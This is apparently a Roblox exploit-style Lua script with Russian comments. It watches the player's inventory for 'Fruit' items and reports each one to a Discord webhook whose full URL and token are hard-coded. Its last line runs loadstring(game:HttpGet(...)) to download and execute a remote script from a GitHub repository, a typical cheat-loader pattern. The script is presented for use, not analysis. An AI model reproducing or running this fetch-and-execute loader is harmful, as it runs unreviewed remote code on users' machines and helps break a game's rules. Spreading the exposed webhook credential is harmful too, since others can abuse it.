local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

local PROXY_URL = "https://discord.com/api/webhooks/1469730327617601880/E_2KCQuiMpbsp24Q27J9n2PKhj-a4nexepAs1rAfeYrnDgw2QHO5t1FBjTzuZqPF-Wgh"

-- Отправка только через RequestAsync
local function sendAlert(itemName)
    local message = {
        content = player.Name .. " получил '" .. itemName .. "'!",
        username = "Инвентарь"
    }
    local json = HttpService:JSONEncode(message)
    
    local success = pcall(function()
        HttpService:RequestAsync({
            Url = PROXY_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end)
    
    if success then
        print("Отправлено в Discord:", itemName)
    else
        warn("Ошибка отправки:", itemName)
    end
end

-- Проверка имени на наличие "Fruit"
local function checkItem(item)
    if item.Name:find("Fruit") then
        print("Найден фрукт:", item.Name)
        sendAlert(item.Name)
    end
end

-- Основное отслеживание
local function startTracking()
    local backpack = player:WaitForChild("Backpack")
    local character = player.Character or player.CharacterAdded:Wait()
    
    -- Новые предметы в инвентаре
    backpack.ChildAdded:Connect(function(item)
        task.wait(0.1)
        checkItem(item)
    end)
    
    -- Новые предметы в руках (только инструменты)
    character.ChildAdded:Connect(function(item)
        if item:IsA("Tool") then
            task.wait(0.1)
            checkItem(item)
        end
    end)
    
    print("Детектор фруктов запущен для", player.Name)
end

-- Запуск
if player.Character then
    task.wait(2)
    startTracking()
end
player.CharacterAdded:Connect(function()
    task.wait(2)
    startTracking()
end)

print("Скрипт запущен. Отслеживаю все фрукты.")

local Settings = {
  JoinTeam = "Pirates"; -- Pirates/Marines
  Translator = true; -- true/false
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/PlockScripts/newredz/refs/heads/main/Remake-version.luau"))(Settings)
